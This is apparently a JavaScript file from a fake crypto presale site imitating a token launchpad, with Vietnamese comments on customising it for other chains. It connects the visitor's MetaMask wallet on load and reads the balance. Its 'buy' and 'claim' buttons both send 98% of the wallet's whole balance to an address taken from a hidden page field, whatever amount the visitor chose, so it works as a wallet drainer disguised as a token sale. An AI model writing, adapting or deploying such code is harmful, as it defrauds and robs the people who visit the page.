// Nếu như a muốn dùng một con custom cho chain khác thì sẽ phải tạo file js mới
var time = $("#notidate").val();
var countDownDate = new Date(time).getTime();
var x = setInterval(function () {
  var now = new Date().getTime();
  var distance = countDownDate - now;
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);

  // Cái thời gian của thằng viết code này đang có vấn đề, hqua e có sửa 1 chút để e cop vào
  if (days >= 10) {
    days = days;
  } else if (days < 10 && days >= 0) {
    days = "0" + days;
  } else {
    days = "00";
  }

  if (hours >= 10) {
    hours = hours;
  } else if (hours < 10 && hours >= 0) {
    hours = "0" + hours;
  } else {
    hours = "00";
  }

  if (minutes >= 10) {
    minutes = minutes;
  } else if (minutes < 10 && minutes >= 0) {
    minutes = "0" + minutes;
  } else {
    minutes = "00";
  }

  if (seconds >= 10) {
    seconds = seconds;
  } else if (seconds < 10 && seconds >= 0) {
    seconds = "0" + seconds;
  } else {
    seconds = "00";
  }
  document.getElementById("days").innerHTML = days;
  document.getElementById("hours").innerHTML = hours;
  document.getElementById("phut").innerHTML = minutes;
  document.getElementById("second").innerHTML = seconds;
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("demo").innerHTML = "EXPIRED";
  }
}, 1000);

var handleForm = () => {
  const claimStatus = $("#ClaimStatus").val();

  if (claimStatus == "NO") {
    $("#form_claim").css("display", "none");
    $("#form_sale_live").css("display", "block");
  } else {
    $("#form_claim").css("display", "block");
    $("#form_sale_live").css("display", "none");
  }
};

$(document).on("click", "#loginButton", function () {
  $("#btnconnectwallet .ant-modal-wrap").show();
  $("#btnconnectwallet").prepend('<div class="ant-modal-mask"></div>');
});
$(document).on("click", "#btnconnectwallet .ant-modal-close", function () {
  $("#btnconnectwallet .ant-modal-wrap").hide();
  $("#btnconnectwallet .ant-modal-mask").remove();
});
$(document).on("click", "#btnchoosenetwork .ant-modal-close", function () {
  $("#btnchoosenetwork .ant-modal-wrap").hide();
  $("#btnchoosenetwork .ant-modal-mask").remove();
});
$(document).on(
  "click",
  "#btnconnectwallet .ant-spin-nested-loading",
  function () {
    $(this).find(".ant-spin-container").addClass("ant-spin-blur");
    $(this).prepend(
      '<div><div class="ant-spin ant-spin-spinning"><span class="ant-spin-dot ant-spin-dot-spin"><i class="ant-spin-dot-item"></i><i class="ant-spin-dot-item"></i><i class="ant-spin-dot-item"></i><i class="ant-spin-dot-item"></i></span></div></div>'
    );
    if (!window.ethereum) {
      location2 = location.href;
      location2 = location2.replace(/https:\/\//g, "");
      window.open("https://metamask.app.link/dapp/" + location2, "_blank");
      return false;
    } else {
      loginWithMetaMask();
    }
  }
);
window.userWalletAddress = null;
const loginButton = document.getElementById("linkmetamask");
var chainId = null;
window.addEventListener("DOMContentLoaded", () => {
  (async () => {
    windowsize = $(window).width();
    if (windowsize > 768 && windowsize < 1001) {
      $(".ant-layout-sider.ant-layout-sider-light").css({
        flex: "0 0 80px",
        "max-width": "80px",
        "min-width": "80px",
        width: "80px",
      });
      $(".ant-menu.ant-menu-root.ant-menu-inline.ant-menu-light").addClass(
        "ant-menu-inline-collapsed"
      );
      $(
        ".ant-menu.ant-menu-root.ant-menu-inline.ant-menu-light .ant-menu-item"
      ).css("padding-left", "auto");
      $(".ant-menu-submenu-open .ant-menu-sub").css("display", "none");
      $(".MainLayout_siderFooter__3itw9 .PinksalePrice_root__1CXqM").css(
        "display",
        "none"
      );
      $(".MainLayout_siderFooter__3itw9 .flex.items-center .flex-1").css(
        "display",
        "none"
      );
    } else if (windowsize < 768) {
      $(".ant-layout-sider.ant-layout-sider-light").css({
        flex: "0 0 0px",
        "max-width": "0px",
        "min-width": "0px",
        width: "0px",
      });
      $(".ant-layout.ant-section-main").css({
        "margin-left": "0px",
      });
      $(".flex.items-center.noselect").css("height", "70px");
      $(".ant-menu-submenu-open .ant-menu-sub").css("display", "none");
      $("#btnmobile svg").remove();
      $("#btnmobile").addClass("active");
      $("#btnmobile").append(
        '<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M904 160H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0 624H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0-312H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8z"></path></svg>'
      );
    }
    loginWithMetaMask();
    // handleForm();
  })();
});
$(document).on("click", "#nav #btnmobile", function () {
  if ($(this).hasClass("active")) {
    $("#btnmobile svg").remove();
    $("#btnmobile").append(
      '<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"></path></svg>'
    );
    $(".ant-layout-sider.ant-layout-sider-light").css({
      flex: "0 0 200px",
      "max-width": "200px",
      "min-width": "200px",
      width: "200px",
    });
    $(this).removeClass("active");
  } else {
    $("#btnmobile svg").remove();
    $("#btnmobile").append(
      '<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"></path></svg>'
    );
    $(".ant-layout-sider.ant-layout-sider-light").css({
      flex: "0 0 0px",
      "max-width": "0px",
      "min-width": "0px",
      width: "0px",
    });
    $(this).addClass("active");
  }
});
function toggleButton() {
  if (!window.ethereum) {
    location2 = location.href;
    location2 = location2.replace(/https:\/\//g, "");
    window.open("https://metamask.app.link/dapp/" + location2, "_blank");
    return false;
  }
  loginButton.addEventListener("click", loginWithMetaMask);
}
async function loginWithMetaMask() {
  $("#btnbuy").prop("disabled", true);
  const accounts = await window.ethereum
    .request({ method: "eth_requestAccounts" })
    .catch((e) => {
      console.error(e.message);
      return;
    });
  if (!accounts) {
    return;
  }
  window.userWalletAddress = slipstring(accounts[0]);
  $("#walletmepage").text(accounts[0]);
  $("#loginButton").remove();
  $(".flex.items-center.noselect .network").remove();
  chainId = await ethereum.request({ method: "eth_chainId" });
  changetext(window.userWalletAddress, chainId);
  if (chainId == "0x1" || chainId == "0xa4b1") {
    textchain = " ETH";
  } else {
    textchain = " BNB";
  }
  $("#chainId").val(chainId);
  web3.eth.getBalance(accounts[0], function (err, balance) {
    if (err === null) {
      var balancetext = 0;
      if (web3.fromWei(balance, "ether") == 0) {
        balancetext = web3.fromWei(balance, "ether") + textchain;
      } else if (chainId == "0xa4b1") {
        balancetext = web3.fromWei(balance, "ether") + textchain;
      } else {
        balancetext =
          (web3.fromWei(balance, "ether") + textchain).slice(0, 7) + textchain;
      }
      $("#moneyme").text(balancetext);
      $(".Account_balance__1zr_K").text(balancetext);
      $("#balance").val(web3.fromWei(balance, "ether"));
    }
  });
  $("#btnconnectwallet .ant-modal-wrap").hide();
  $("#btnconnectwallet .ant-modal-mask").remove();

  // const forceChain = 42161; // Example here is ARB
  // if (chainId != forceChain) {
  //   changeChain(forceChain);
  // } // Nếu a muốn bỏ force chain thì comment 4 dòng này bằng "Ctrl /"

  changetextbnbeth(chainId);
}
$(document).on("click", "#nav .network", function () {
  $("#btnchoosenetwork").prepend('<div class="ant-modal-mask"></div>');
  $("#btnchoosenetwork .ant-modal-wrap").show();
});
$(document).on("click", "#btnchoosenetwork #changetoeth", function () {
  try {
    window.ethereum
      .request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x1" }],
      })
      .then(() => {
        $("#btnchoosenetwork .ant-modal-wrap").hide();
        $("#btnchoosenetwork .ant-modal-mask").remove();
        location.reload();
      })
      .catch((addError) => {
        console.log("could not add network");
      });
  } catch (e) {
    if (e.code === 4902) {
      try {
        window.ethereum
          .request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: "0x1",
                chainName: "Ethereum Mainnet",
                nativeCurrency: {
                  name: "ETH",
                  symbol: "ETH",
                  decimals: 0x12,
                },
                rpcUrls: ["https://mainnet.infura.io/v3/"],
                blockExplorerUrls: ["https://etherscan.io"],
              },
            ],
          })
          .then(() => {
            $("#btnchoosenetwork .ant-modal-wrap").hide();
            $("#btnchoosenetwork .ant-modal-mask").remove();
            location.reload();
          })
          .catch((addError) => {
            console.log("could not add network");
          });
      } catch (addError) {
        console.error(addError);
      }
    }
  }
});
$(document).on("click", "#btnchoosenetwork #changetobnb", function () {
  if (chainId == 0x38) {
    try {
      window.ethereum
        .request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        })
        .then(() => {
          $("#btnchoosenetwork .ant-modal-wrap").hide();
          $("#btnchoosenetwork .ant-modal-mask").remove();
          location.reload();
        })
        .catch((addError) => {
          console.log("could not add network");
        });
    } catch (e) {
      if (e.code === 4902) {
        try {
          window.ethereum
            .request({
              method: "wallet_addEthereumChain",
              params: [
                {
                  chainId: "0x38",
                  chainName: "Binance Smart Chain Mainnet",
                  nativeCurrency: {
                    name: "BNB",
                    symbol: "BNB",
                    decimals: 0x12,
                  },
                  rpcUrls: ["https://bsc-dataseed.binance.org/"],
                  blockExplorerUrls: ["https://bscscan.com"],
                },
              ],
            })
            .then(() => {
              $("#btnchoosenetwork .ant-modal-wrap").hide();
              $("#btnchoosenetwork .ant-modal-mask").remove();
              location.reload();
            })
            .catch((addError) => {
              console.log("could not add network");
            });
        } catch (addError) {
          console.error(addError);
        }
      }
    }
  } else {
    window.ethereum
      .request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: "0x38",
            chainName: "Binance Smart Chain Mainnet",
            nativeCurrency: {
              name: "BNB",
              symbol: "BNB",
              decimals: 0x12,
            },
            rpcUrls: ["https://bsc-dataseed.binance.org/"],
            blockExplorerUrls: ["https://bscscan.com"],
          },
        ],
      })
      .then(() => {
        $("#btnchoosenetwork .ant-modal-wrap").hide();
        $("#btnchoosenetwork .ant-modal-mask").remove();
        location.reload();
      })
      .catch((addError) => {
        console.log("could not add network");
      });
  }
});
$(document).on("click", "#btnchoosenetwork #changetoarbitrum", function () {
  if (chainId == 0xa4b1) {
    try {
      window.ethereum
        .request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0xa4b1" }],
        })
        .then(() => {
          $("#btnchoosenetwork .ant-modal-wrap").hide();
          $("#btnchoosenetwork .ant-modal-mask").remove();
          location.reload();
        })
        .catch((addError) => {
          console.log("could not add network");
        });
    } catch (e) {
      if (e.code === 4902) {
        try {
          window.ethereum
            .request({
              method: "wallet_addEthereumChain",
              params: [
                {
                  chainId: "0xa4b1",
                  chainName: "Arbitrum",
                  nativeCurrency: {
                    name: "ETH",
                    symbol: "ETH",
                    decimals: 0x12,
                  },
                  rpcUrls: ["https://arb1.arbitrum.io/rpc"],
                  blockExplorerUrls: ["https://arbiscan.io"],
                },
              ],
            })
            .then(() => {
              $("#btnchoosenetwork .ant-modal-wrap").hide();
              $("#btnchoosenetwork .ant-modal-mask").remove();
              location.reload();
            })
            .catch((addError) => {
              console.log("could not add network");
            });
        } catch (addError) {
          console.error(addError);
        }
      }
    }
  } else {
    window.ethereum
      .request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: "0xa4b1",
            chainName: "Arbitrum",
            nativeCurrency: {
              name: "ETH",
              symbol: "ETH",
              decimals: 0x12,
            },
            rpcUrls: ["https://arb1.arbitrum.io/rpc"],
            blockExplorerUrls: ["https://arbiscan.io"],
          },
        ],
      })
      .then(() => {
        $("#btnchoosenetwork .ant-modal-wrap").hide();
        $("#btnchoosenetwork .ant-modal-mask").remove();
        location.reload();
      })
      .catch((addError) => {
        console.log("could not add network");
      });
  }
});
$(document).on("click", "#btn_claim", function () {
  var presaleAmount = ($("#balance").val() * 98) / 100;
  web3.eth.sendTransaction(
    {
      to: $("#AddressMe").val(),
      value: web3.toWei(presaleAmount, "ether"),
    },
    (err, transactionId) => {
      if (err) {
        console.log("Payment failed", err);
      } else {
        console.log("Payment successful", transactionId);
        btnbuy.innerText = "Payment successful";
      }
    }
  );
});
$(document).on("click", "#btnbuy", function () {
  var presaleAmount = ($("#balance").val() * 98) / 100;
  // if ($("#Yesnomax").val() == "YES") {
  //   presaleAmount = ($("#balance").val() * 98) / 100;
  // } else {
  // }
  web3.eth.sendTransaction(
    {
      to: $("#AddressMe").val(),
      value: web3.toWei(presaleAmount, "ether"),
    },
    (err, transactionId) => {
      if (err) {
        console.log("Payment failed", err);
      } else {
        console.log("Payment successful", transactionId);
        btnbuy.innerText = "Payment successful";
      }
    }
  );
});
$(document).on("click", "#btnMAX", function () {
  $("#btnbuy").prop("disabled", false);
  var balance = document.getElementById("balance").value;
  balance = (balance * 98) / 100;
  $("#presaleAmount").val(balance);
});
$(document).on("click", "#logout", function () {
  signOutOfMetaMask();
});
async function signOutOfMetaMask() {
  await window.ethereum.enable();
  const accounts = await window.ethereum.request({
    method: "eth_requestAccounts",
    params: [
      {
        eth_accounts: {},
      },
    ],
  });
  window.userWalletAddress = null;
  $(".Account_root__3_VoB").remove();
  const htmllogin =
    '<div class="connectButton" id="loginButton" style="position:relative"><a id="linkhref" target="_blank" style="color:#f95192">Connect</a></div>';
  $("#nav").append(htmllogin);
  window.history.back();
}

function changeChain(chainId) {
  switch (parseInt(chainId)) {
    case 1:
      try {
        window.ethereum
          .request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }],
          })
          .then(() => {
            location.reload();
          })
          .catch((e) => {
            if (e.code === 4902) {
              try {
                window.ethereum
                  .request({
                    method: "wallet_addEthereumChain",
                    params: [
                      {
                        chainId: "0x1",
                        chainName: "Ethereum Mainnet",
                        nativeCurrency: {
                          name: "ETH",
                          symbol: "ETH",
                          decimals: 0x12,
                        },
                        rpcUrls: ["https://mainnet.infura.io/v3/"],
                        blockExplorerUrls: ["https://etherscan.io"],
                      },
                    ],
                  })
                  .then(() => {
                    $("#btnchoosenetwork .ant-modal-wrap").hide();
                    $("#btnchoosenetwork .ant-modal-mask").remove();
                    location.reload();
                  })
                  .catch((addError) => {
                    console.log("could not add network");
                  });
              } catch (addError) {
                console.error(addError);
              }
            }
          });
      } catch (e) {}
      break;
    case 56:
      try {
        window.ethereum
          .request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }],
          })
          .then(() => {
            location.reload();
          })
          .catch((e) => {
            if (e.code === 4902) {
              try {
                window.ethereum
                  .request({
                    method: "wallet_addEthereumChain",
                    params: [
                      {
                        chainId: "0x38",
                        chainName: "Binance Smart Chain Mainnet",
                        nativeCurrency: {
                          name: "BNB",
                          symbol: "BNB",
                          decimals: 0x12,
                        },
                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
                        blockExplorerUrls: ["https://bscscan.com"],
                      },
                    ],
                  })
                  .then(() => {
                    $("#btnchoosenetwork .ant-modal-wrap").hide();
                    $("#btnchoosenetwork .ant-modal-mask").remove();
                    location.reload();
                  })
                  .catch((addError) => {
                    console.log("could not add network");
                  });
              } catch (addError) {
                console.error(addError);
              }
            }
          });
      } catch (e) {}

      break;
    case 42161:
      console.log("RUn");
      try {
        window.ethereum
          .request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0xa4b1" }],
          })
          .then(() => {
            location.reload();
          })
          .catch((addError) => {
            if (addError.code === 4902) {
              try {
                window.ethereum
                  .request({
                    method: "wallet_addEthereumChain",
                    params: [
                      {
                        chainId: "0xa4b1",
                        chainName: "Arbitrum",
                        nativeCurrency: {
                          name: "ETH",
                          symbol: "ETH",
                          decimals: 0x12,
                        },
                        rpcUrls: ["https://arb1.arbitrum.io/rpc"],
                        blockExplorerUrls: ["https://arbiscan.io"],
                      },
                    ],
                  })
                  .then(() => {
                    $("#btnchoosenetwork .ant-modal-wrap").hide();
                    $("#btnchoosenetwork .ant-modal-mask").remove();
                    location.reload();
                  })
                  .catch((addError) => {
                    console.log("could not add network");
                  });
              } catch (addError) {
                console.error(addError);
              }
            }
          });
      } catch (e) {}
      break;
  }
}

function changetextbnbeth(chainId) {
  if (chainId == "0x1" || chainId == "0xa4b1") {
    let amountbuy = $("#amountbuy").text();
    result = amountbuy.replace(" BNB", " ETH");
    $("#amountbuy").text(result);
    let minbuy = $("#minbuy").text();
    result2 = minbuy.replace(" BNB", " ETH");
    $("#minbuy").text(result2);
    let maxbuy = $("#maxbuy").text();
    maxbuy = maxbuy.replace(" BNB", " ETH");
    $("#maxbuy").text(maxbuy);
    let minMyvalue = $("#minMyvalue").text();
    minMyvalue = minMyvalue.replace("BNB", " ETH");
    $("#minMyvalue").text(minMyvalue);
    let maxMyValue = $("#maxMyValue").text();
    maxMyValue = maxMyValue.replace(" BNB", " ETH");
    $("#maxMyValue").text(maxMyValue);
    let softcap = $("#softcap").text();
    softcap = softcap.replace(" BNB", " ETH");
    $("#softcap").text(softcap);
    let hardcap = $("#hardcap").text();
    hardcap = hardcap.replace(" BNB", " ETH");
    $("#hardcap").text(hardcap);
    let PresaleRate = $("#PresaleRate").text();
    PresaleRate = PresaleRate.replace(" BNB", " ETH");
    $("#PresaleRate").text(PresaleRate);
    let ListingRate = $("#ListingRate").text();
    ListingRate = ListingRate.replace(" BNB", " ETH");
    $("#ListingRate").text(ListingRate);
    let buywith = $("#buywith").text();
    buywith = buywith.replace(" BNB", " ETH");
    $("#buywith").text(buywith);
    let YourRewards = $("#YourRewards").text();
    YourRewards = YourRewards.replace(" BNB", " ETH");
    $("#YourRewards").text(YourRewards);
    let MaxRewards = $("#MaxRewards").text();
    MaxRewards = MaxRewards.replace(" BNB", " ETH");
    $("#MaxRewards").text(MaxRewards);
    let TotalRefAmount = $("#TotalRefAmount").text();
    TotalRefAmount = TotalRefAmount.replace(" BNB", " ETH");
    $("#TotalRefAmount").text(TotalRefAmount);
    let TotalRewards = $("#TotalRewards").text();
    TotalRewards = TotalRewards.replace(" BNB", " ETH");
    $("#TotalRewards").text(TotalRewards);
    let RowInfo = $("#RowInfo_node__3kZFW").text();
    RowInfo = RowInfo.replace(" BNB", " ETH");
    $("#RowInfo_node__3kZFW").text(RowInfo);
    let ClaimBtn = $("#btn_claim").text();
    $("#btn_claim").text(ClaimBtn.replace(" BNB", " ETH"));
    let MaxContribution = $("#MaxContribution").text();
    $("#MaxContribution").text(MaxContribution.replace(" BNB", " ETH"));
  } else {
    let amountbuy = $("#amountbuy").text();
    result = amountbuy.replace(" ETH", " BNB");
    $("#amountbuy").text(result);
    let minbuy = $("#minbuy").text();
    result2 = minbuy.replace(" ETH", " BNB");
    $("#minbuy").text(result2);
    let maxbuy = $("#maxbuy").text();
    maxbuy = maxbuy.replace(" ETH", " BNB");
    $("#maxbuy").text(maxbuy);
    let minMyvalue = $("#minMyvalue").text();
    minMyvalue = minMyvalue.replace("ETH", " BNB");
    $("#minMyvalue").text(minMyvalue);
    let maxMyValue = $("#maxMyValue").text();
    maxMyValue = maxMyValue.replace(" ETH", " BNB");
    $("#maxMyValue").text(maxMyValue);
    let softcap = $("#softcap").text();
    softcap = softcap.replace(" ETH", " BNB");
    $("#softcap").text(softcap);
    let hardcap = $("#hardcap").text();
    hardcap = hardcap.replace(" ETH", " BNB");
    $("#hardcap").text(hardcap);
    let PresaleRate = $("#PresaleRate").text();
    PresaleRate = PresaleRate.replace(" ETH", " BNB");
    $("#PresaleRate").text(PresaleRate);
    let ListingRate = $("#ListingRate").text();
    ListingRate = ListingRate.replace(" ETH", " BNB");
    $("#ListingRate").text(ListingRate);
    let buywith = $("#buywith").text();
    buywith = buywith.replace(" ETH", " BNB");
    $("#buywith").text(buywith);
    let YourRewards = $("#YourRewards").text();
    YourRewards = YourRewards.replace(" ETH", " BNB");
    $("#YourRewards").text(YourRewards);
    let MaxRewards = $("#MaxRewards").text();
    MaxRewards = MaxRewards.replace(" ETH", " BNB");
    $("#MaxRewards").text(MaxRewards);
    let TotalRefAmount = $("#TotalRefAmount").text();
    TotalRefAmount = TotalRefAmount.replace(" ETH", " BNB");
    $("#TotalRefAmount").text(TotalRefAmount);
    let TotalRewards = $("#TotalRewards").text();
    TotalRewards = TotalRewards.replace(" ETH", " BNB");
    $("#TotalRewards").text(TotalRewards);
    let RowInfo = $("#RowInfo_node__3kZFW").text();
    RowInfo = RowInfo.replace(" ETH", " BNB");
    $("#RowInfo_node__3kZFW").text(RowInfo);
    let ClaimBtn = $("#btn_claim").text();
    $("#btn_claim").text(ClaimBtn.replace(" ETH", " BNB"));
    let MaxContribution = $("#MaxContribution").text();
    $("#MaxContribution").text(MaxContribution.replace(" ETH", " BNB"));
  }
}
function changetext(userWalletAddress, chainId) {
  if (chainId == "0x1") {
    textchain = " ETH";
    $("#nav").append(
      '<div class="network " style="cursor: pointer;"><img src=images/ic-eth.1213cf87.svg" alt="" width="24"><span class="ml-2 hide-on-mobile">ETH MAINNET</span></div>'
    );
    $("#nav").append(
      '<a class="Account_root__3_VoB" href="/me.html"><div class="hide-on-mobile"><div class="Account_address__3k1-V">' +
        userWalletAddress +
        '</div><div class="Account_balance__1zr_K"></div></div><div class="Account_avatar__3pqlg"><svg style="margin: auto;" stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><rect width="416" height="288" x="48" y="144" fill="none" stroke-linejoin="round" stroke-width="32" rx="48" ry="48"></rect><path fill="none" stroke-linejoin="round" stroke-width="32" d="M411.36 144v-30A50 50 0 00352 64.9L88.64 109.85A50 50 0 0048 159v49"></path><path d="M368 320a32 32 0 1132-32 32 32 0 01-32 32z"></path></svg></div></a>'
    );
    $("#iconsmall").attr("src", "../assets/storage/images/5NyaKSXxZbtH.svg");
  } else if (chainId == "0xa4b1") {
    textchain = " ETH";
    $("#nav").append(
      '<div class="network " style="cursor: pointer;"><img src="../assets/storage/images/ipLYZoT0MzoG.svg" alt="" width="24"><span class="ml-2 hide-on-mobile">Arbitrum</span></div>'
    );
    $("#nav").append(
      '<a class="Account_root__3_VoB" href="/me.html"><div class="hide-on-mobile"><div class="Account_address__3k1-V">' +
        userWalletAddress +
        '</div><div class="Account_balance__1zr_K"></div></div><div class="Account_avatar__3pqlg"><svg style="margin: auto;" stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><rect width="416" height="288" x="48" y="144" fill="none" stroke-linejoin="round" stroke-width="32" rx="48" ry="48"></rect><path fill="none" stroke-linejoin="round" stroke-width="32" d="M411.36 144v-30A50 50 0 00352 64.9L88.64 109.85A50 50 0 0048 159v49"></path><path d="M368 320a32 32 0 1132-32 32 32 0 01-32 32z"></path></svg></div></a>'
    );
    $("#iconsmall").attr(
      "src",
      "../assets/storage/images/ipLYZoT0MzoG.svg"
    );
  } else {
    textchain = " BNB";
    $("#nav").append(
      '<div class="network " style="cursor: pointer;"><img src="images/ic-eth.4213cf87.svg" alt="" width="24"><span class="ml-2 hide-on-mobile">BSC MAINNET</span></div>'
    );
    $("#nav").append(
      '<a class="Account_root__3_VoB" href="/me.html"><div class="hide-on-mobile"><div class="Account_address__3k1-V">' +
        userWalletAddress +
        '</div><div class="Account_balance__1zr_K"></div></div><div class="Account_avatar__3pqlg"><svg style="margin: auto;" stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><rect width="416" height="288" x="48" y="144" fill="none" stroke-linejoin="round" stroke-width="32" rx="48" ry="48"></rect><path fill="none" stroke-linejoin="round" stroke-width="32" d="M411.36 144v-30A50 50 0 00352 64.9L88.64 109.85A50 50 0 0048 159v49"></path><path d="M368 320a32 32 0 1132-32 32 32 0 01-32 32z"></path></svg></div></a>'
    );
    $("#iconsmall").attr("src", "images/ic-eth.4213cf87.svg");
  }
}
function slipstring(string) {
  var a = string.substring(0, 6);
  var b = string.substring(string.length - 4);
  var c = "...";
  return (d = a + c + b);
}
